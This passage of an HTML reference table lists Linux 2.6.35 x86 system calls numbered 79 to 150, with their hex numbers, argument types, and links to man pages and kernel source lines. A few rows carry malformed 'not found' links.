rel="noopener">sys_settimeofday</a></td><td>0x4f</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="noopener">struct timeval __user *tv</a></td><td>struct timezone __user *tz</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L185" target="_blank" rel="noopener">kernel/time.c:185</a></td></tr><tr><td>80</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgroups16.2.html" target="_blank" rel="noopener">sys_getgroups16</a></td><td>0x50</td><td>int gidsetsize</td><td>old_gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L164" target="_blank" rel="noopener">kernel/uid16.c:164</a></td></tr><tr><td>81</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgroups16.2.html" target="_blank" rel="noopener">sys_setgroups16</a></td><td>0x51</td><td>int gidsetsize</td><td>old_gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L187" target="_blank" rel="noopener">kernel/uid16.c:187</a></td></tr><tr><td>82</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_select.2.html" target="_blank" rel="noopener">sys_old_select</a></td><td>0x52</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L695" target="_blank" rel="noopener">struct sel_arg_struct __user *arg</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L701" target="_blank" rel="noopener">fs/select.c:701</a></td></tr><tr><td>83</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/symlink.2.html" target="_blank" rel="noopener">sys_symlink</a></td><td>0x53</td><td>const char __user *old</td><td>const char __user *new</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2419" target="_blank" rel="noopener">fs/namei.c:2419</a></td></tr><tr><td>84</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lstat.2.html" target="_blank" rel="noopener">sys_lstat</a></td><td>0x54</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="noopener">struct __old_kernel_stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L162" target="_blank" rel="noopener">fs/stat.c:162</a></td></tr><tr><td>85</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readlink.2.html" target="_blank" rel="noopener">sys_readlink</a></td><td>0x55</td><td>const char __user *path</td><td>char __user *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L311" target="_blank" rel="noopener">fs/stat.c:311</a></td></tr><tr><td>86</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/uselib.2.html" target="_blank" rel="noopener">sys_uselib</a></td><td>0x56</td><td>const char __user *library</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/exec.c?v=2.6.35#L107" target="_blank" rel="noopener">fs/exec.c:107</a></td></tr><tr><td>87</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/swapon.2.html" target="_blank" rel="noopener">sys_swapon</a></td><td>0x57</td><td>const char __user *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/swapfile.c?v=2.6.35#L1793" target="_blank" rel="noopener">mm/swapfile.c:1793</a></td></tr><tr><td>88</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/reboot.2.html" target="_blank" rel="noopener">sys_reboot</a></td><td>0x58</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void __user *arg</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L368" target="_blank" rel="noopener">kernel/sys.c:368</a></td></tr><tr><td>89</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_readdir.2.html" target="_blank" rel="noopener">sys_old_readdir</a></td><td>0x59</td><td>unsigned int</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L61" target="_blank" rel="noopener">struct old_linux_dirent __user *</a></td><td>unsigned int</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L105" target="_blank" rel="noopener">fs/readdir.c:105</a></td></tr><tr><td>90</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_mmap.2.html" target="_blank" rel="noopener">sys_old_mmap</a></td><td>0x5a</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L1132" target="_blank" rel="noopener">struct mmap_arg_struct __user *arg</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L1141" target="_blank" rel="noopener">mm/mmap.c:1141</a></td></tr><tr><td>91</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munmap.2.html" target="_blank" rel="noopener">sys_munmap</a></td><td>0x5b</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L2109" target="_blank" rel="noopener">mm/mmap.c:2109</a></td></tr><tr><td>92</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/truncate.2.html" target="_blank" rel="noopener">sys_truncate</a></td><td>0x5c</td><td>const char __user *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L127" target="_blank" rel="noopener">fs/open.c:127</a></td></tr><tr><td>93</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ftruncate.2.html" target="_blank" rel="noopener">sys_ftruncate</a></td><td>0x5d</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L178" target="_blank" rel="noopener">fs/open.c:178</a></td></tr><tr><td>94</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchmod.2.html" target="_blank" rel="noopener">sys_fchmod</a></td><td>0x5e</td><td>unsigned int fd</td><td>mode_t mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L436" target="_blank" rel="noopener">fs/open.c:436</a></td></tr><tr><td>95</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchown16.2.html" target="_blank" rel="noopener">sys_fchown16</a></td><td>0x5f</td><td>unsigned int fd</td><td>old_uid_t user</td><td>old_gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L35" target="_blank" rel="noopener">kernel/uid16.c:35</a></td></tr><tr><td>96</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpriority.2.html" target="_blank" rel="noopener">sys_getpriority</a></td><td>0x60</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L216" target="_blank" rel="noopener">kernel/sys.c:216</a></td></tr><tr><td>97</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setpriority.2.html" target="_blank" rel="noopener">sys_setpriority</a></td><td>0x61</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L149" target="_blank" rel="noopener">kernel/sys.c:149</a></td></tr><tr><td>98</td><td>not implemented</td><td>0x62</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>99</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/statfs.2.html" target="_blank" rel="noopener">sys_statfs</a></td><td>0x63</td><td>const char __user * path</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L22" target="_blank" rel="noopener">struct statfs __user *buf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L102" target="_blank" rel="noopener">fs/statfs.c:102</a></td></tr><tr><td>100</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatfs.2.html" target="_blank" rel="noopener">sys_fstatfs</a></td><td>0x64</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L22" target="_blank" rel="noopener">struct statfs __user *buf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L136" target="_blank" rel="noopener">fs/statfs.c:136</a></td></tr><tr><td>101</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioperm.2.html" target="_blank" rel="noopener">sys_ioperm</a></td><td>0x65</td><td>unsigned long</td><td>unsigned long</td><td>int</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>102</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/socketcall.2.html" target="_blank" rel="noopener">sys_socketcall</a></td><td>0x66</td><td>int call</td><td>unsigned long __user *args</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210" target="_blank" rel="noopener">net/socket.c:2210</a></td></tr><tr><td>103</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/syslog.2.html" target="_blank" rel="noopener">sys_syslog</a></td><td>0x67</td><td>int type</td><td>char __user *buf</td><td>int len</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/printk.c?v=2.6.35#L412" target="_blank" rel="noopener">kernel/printk.c:412</a></td></tr><tr><td>104</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setitimer.2.html" target="_blank" rel="noopener">sys_setitimer</a></td><td>0x68</td><td>int which</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L263" target="_blank" rel="noopener">struct itimerval __user *value</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L263" target="_blank" rel="noopener">struct itimerval __user *ovalue</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/itimer.c?v=2.6.35#L279" target="_blank" rel="noopener">kernel/itimer.c:279</a></td></tr><tr><td>105</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getitimer.2.html" target="_blank" rel="noopener">sys_getitimer</a></td><td>0x69</td><td>int which</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L263" target="_blank" rel="noopener">struct itimerval __user *value</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/itimer.c?v=2.6.35#L103" target="_blank" rel="noopener">kernel/itimer.c:103</a></td></tr><tr><td>106</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newstat.2.html" target="_blank" rel="noopener">sys_newstat</a></td><td>0x6a</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="noopener">struct stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L237" target="_blank" rel="noopener">fs/stat.c:237</a></td></tr><tr><td>107</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newlstat.2.html" target="_blank" rel="noopener">sys_newlstat</a></td><td>0x6b</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="noopener">struct stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L247" target="_blank" rel="noopener">fs/stat.c:247</a></td></tr><tr><td>108</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newfstat.2.html" target="_blank" rel="noopener">sys_newfstat</a></td><td>0x6c</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="noopener">struct stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L273" target="_blank" rel="noopener">fs/stat.c:273</a></td></tr><tr><td>109</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/uname.2.html" target="_blank" rel="noopener">sys_uname</a></td><td>0x6d</td><td><a href="http://lxr.free-electrons.com/source/include/linux/utsname.h?v=2.6.35#L16" target="_blank" rel="noopener">struct old_utsname __user *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1115" target="_blank" rel="noopener">kernel/sys.c:1115</a></td></tr><tr><td>110</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/iopl.2.html" target="_blank" rel="noopener">sys_iopl</a></td><td>0x6e</td><td>unsigned int</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>111</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vhangup.2.html" target="_blank" rel="noopener">sys_vhangup</a></td><td>0x6f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L1008" target="_blank" rel="noopener">fs/open.c:1008</a></td></tr><tr><td>112</td><td>not implemented</td><td>0x70</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>113</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vm86old.2.html" target="_blank" rel="noopener">sys_vm86old</a></td><td>0x71</td><td><a href="http://lxr.free-electrons.com/source/arch/x86/include/asm/vm86.h?v=2.6.35#L96" target="_blank" rel="noopener">struct vm86_struct __user *</a></td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>114</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/wait4.2.html" target="_blank" rel="noopener">sys_wait4</a></td><td>0x72</td><td>pid_t pid</td><td>int __user *stat_addr</td><td>int options</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L22" target="_blank" rel="noopener">struct rusage __user *ru</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1726" target="_blank" rel="noopener">kernel/exit.c:1726</a></td></tr><tr><td>115</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/swapoff.2.html" target="_blank" rel="noopener">sys_swapoff</a></td><td>0x73</td><td>const char __user *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/swapfile.c?v=2.6.35#L1533" target="_blank" rel="noopener">mm/swapfile.c:1533</a></td></tr><tr><td>116</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysinfo.2.html" target="_blank" rel="noopener">sys_sysinfo</a></td><td>0x74</td><td>struct sysinfo __user *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1565" target="_blank" rel="noopener">kernel/timer.c:1565</a></td></tr><tr><td>117</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ipc.2.html" target="_blank" rel="noopener">sys_ipc</a></td><td>0x75</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/syscall.c?v=2.6.35#L16" target="_blank" rel="noopener">ipc/syscall.c:16</a></td></tr><tr><td>118</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsync.2.html" target="_blank" rel="noopener">sys_fsync</a></td><td>0x76</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/sync.c?v=2.6.35#L221" target="_blank" rel="noopener">fs/sync.c:221</a></td></tr><tr><td>119</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigreturn.2.html" target="_blank" rel="noopener">sys_sigreturn</a></td><td>0x77</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L758" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:758</a></td></tr><tr><td>120</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clone.2.html" target="_blank" rel="noopener">sys_clone</a></td><td>0x78</td><td>unsigned long</td><td>unsigned long</td><td>unsigned long</td><td>unsigned long</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L733" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:733</a></td></tr><tr><td>121</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setdomainname.2.html" target="_blank" rel="noopener">sys_setdomainname</a></td><td>0x79</td><td>char __user *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1214" target="_blank" rel="noopener">kernel/sys.c:1214</a></td></tr><tr><td>122</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newuname.2.html" target="_blank" rel="noopener">sys_newuname</a></td><td>0x7a</td><td><a href="http://lxr.free-electrons.com/source/include/linux/utsname.h?v=2.6.35#L24" target="_blank" rel="noopener">struct new_utsname __user *name</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1097" target="_blank" rel="noopener">kernel/sys.c:1097</a></td></tr><tr><td>123</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/modify_ldt.2.html" target="_blank" rel="noopener">sys_modify_ldt</a></td><td>0x7b</td><td>int</td><td>void __user *</td><td>unsigned long</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>124</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/adjtimex.2.html" target="_blank" rel="noopener">sys_adjtimex</a></td><td>0x7c</td><td><a href="http://lxr.free-electrons.com/source/include/linux/timex.h?v=2.6.35#L64" target="_blank" rel="noopener">struct timex __user *txc_p</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L206" target="_blank" rel="noopener">kernel/time.c:206</a></td></tr><tr><td>125</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mprotect.2.html" target="_blank" rel="noopener">sys_mprotect</a></td><td>0x7d</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mprotect.c?v=2.6.35#L221" target="_blank" rel="noopener">mm/mprotect.c:221</a></td></tr><tr><td>126</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigprocmask.2.html" target="_blank" rel="noopener">sys_sigprocmask</a></td><td>0x7e</td><td>int how</td><td>old_sigset_t __user *set</td><td>old_sigset_t __user *oset</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2573" target="_blank" rel="noopener">kernel/signal.c:2573</a></td></tr><tr><td>127</td><td>not implemented</td><td>0x7f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>128</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/init_module.2.html" target="_blank" rel="noopener">sys_init_module</a></td><td>0x80</td><td>void __user *umod</td><td>unsigned long len</td><td>const char __user *uargs</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/module.c?v=2.6.35#L2611" target="_blank" rel="noopener">kernel/module.c:2611</a></td></tr><tr><td>129</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/delete_module.2.html" target="_blank" rel="noopener">sys_delete_module</a></td><td>0x81</td><td>const char __user *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/module.c?v=2.6.35#L720" target="_blank" rel="noopener">kernel/module.c:720</a></td></tr><tr><td>130</td><td>not implemented</td><td>0x82</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>131</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/quotactl.2.html" target="_blank" rel="noopener">sys_quotactl</a></td><td>0x83</td><td>unsigned int cmd</td><td>const char __user *special</td><td>qid_t id</td><td>void __user *addr</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/quota/quota.c?v=2.6.35#L333" target="_blank" rel="noopener">fs/quota/quota.c:333</a></td></tr><tr><td>132</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpgid.2.html" target="_blank" rel="noopener">sys_getpgid</a></td><td>0x84</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L990" target="_blank" rel="noopener">kernel/sys.c:990</a></td></tr><tr><td>133</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchdir.2.html" target="_blank" rel="noopener">sys_fchdir</a></td><td>0x85</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L382" target="_blank" rel="noopener">fs/open.c:382</a></td></tr><tr><td>134</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/bdflush.2.html" target="_blank" rel="noopener">sys_bdflush</a></td><td>0x86</td><td>int func</td><td>long data</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/buffer.c?v=2.6.35#L3278" target="_blank" rel="noopener">fs/buffer.c:3278</a></td></tr><tr><td>135</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysfs.2.html" target="_blank" rel="noopener">sys_sysfs</a></td><td>0x87</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/filesystems.c?v=2.6.35#L182" target="_blank" rel="noopener">fs/filesystems.c:182</a></td></tr><tr><td>136</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/personality.2.html" target="_blank" rel="noopener">sys_personality</a></td><td>0x88</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exec_domain.c?v=2.6.35#L191" target="_blank" rel="noopener">kernel/exec_domain.c:191</a></td></tr><tr><td>137</td><td>not implemented</td><td>0x89</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>138</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsuid16.2.html" target="_blank" rel="noopener">sys_setfsuid16</a></td><td>0x8a</td><td>old_uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L118" target="_blank" rel="noopener">kernel/uid16.c:118</a></td></tr><tr><td>139</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsgid16.2.html" target="_blank" rel="noopener">sys_setfsgid16</a></td><td>0x8b</td><td>old_gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L126" target="_blank" rel="noopener">kernel/uid16.c:126</a></td></tr><tr><td>140</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/llseek.2.html" target="_blank" rel="noopener">sys_llseek</a></td><td>0x8c</td><td>unsigned int fd</td><td>unsigned long offset_high</td><td>unsigned long offset_low</td><td>loff_t __user *result</td><td>unsigned int origin</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L191" target="_blank" rel="noopener">fs/read_write.c:191</a></td></tr><tr><td>141</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getdents.2.html" target="_blank" rel="noopener">sys_getdents</a></td><td>0x8d</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L135" target="_blank" rel="noopener">struct linux_dirent __user *dirent</a></td><td>unsigned int count</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L191" target="_blank" rel="noopener">fs/readdir.c:191</a></td></tr><tr><td>142</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/select.2.html" target="_blank" rel="noopener">sys_select</a></td><td>0x8e</td><td>int n</td><td>fd_set __user *inp</td><td>fd_set __user *outp</td><td>fd_set __user *exp</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="noopener">struct timeval __user *tvp</a></td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L596" target="_blank" rel="noopener">fs/select.c:596</a></td></tr><tr><td>143</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/flock.2.html" target="_blank" rel="noopener">sys_flock</a></td><td>0x8f</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/locks.c?v=2.6.35#L1569" target="_blank" rel="noopener">fs/locks.c:1569</a></td></tr><tr><td>144</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msync.2.html" target="_blank" rel="noopener">sys_msync</a></td><td>0x90</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/msync.c?v=2.6.35#L31" target="_blank" rel="noopener">mm/msync.c:31</a></td></tr><tr><td>145</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readv.2.html" target="_blank" rel="noopener">sys_readv</a></td><td>0x91</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L711" target="_blank" rel="noopener">fs/read_write.c:711</a></td></tr><tr><td>146</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/writev.2.html" target="_blank" rel="noopener">sys_writev</a></td><td>0x92</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L732" target="_blank" rel="noopener">fs/read_write.c:732</a></td></tr><tr><td>147</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getsid.2.html" target="_blank" rel="noopener">sys_getsid</a></td><td>0x93</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1027" target="_blank" rel="noopener">kernel/sys.c:1027</a></td></tr><tr><td>148</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fdatasync.2.html" target="_blank" rel="noopener">sys_fdatasync</a></td><td>0x94</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/sync.c?v=2.6.35#L226" target="_blank" rel="noopener">fs/sync.c:226</a></td></tr><tr><td>149</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysctl.2.html" target="_blank" rel="noopener">sys_sysctl</a></td><td>0x95</td><td><a href="http://lxr.free-electrons.com/source/include/linux/sysctl.h?v=2.6.35#L36" target="_blank" rel="noopener">struct __sysctl_args __user *args</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sysctl_binary.c?v=2.6.35#L1462" target="_blank" rel="noopener">kernel/sysctl_binary.c:1462</a></td></tr><tr><td>150</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlock.2.html" target="_blank" rel="noopener">sys_mlock</a></td><td>0x96</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L491" target="_blank" rel="noopener">mm/mlock.c:491</a></td></tr><tr><td>151</td><td><a 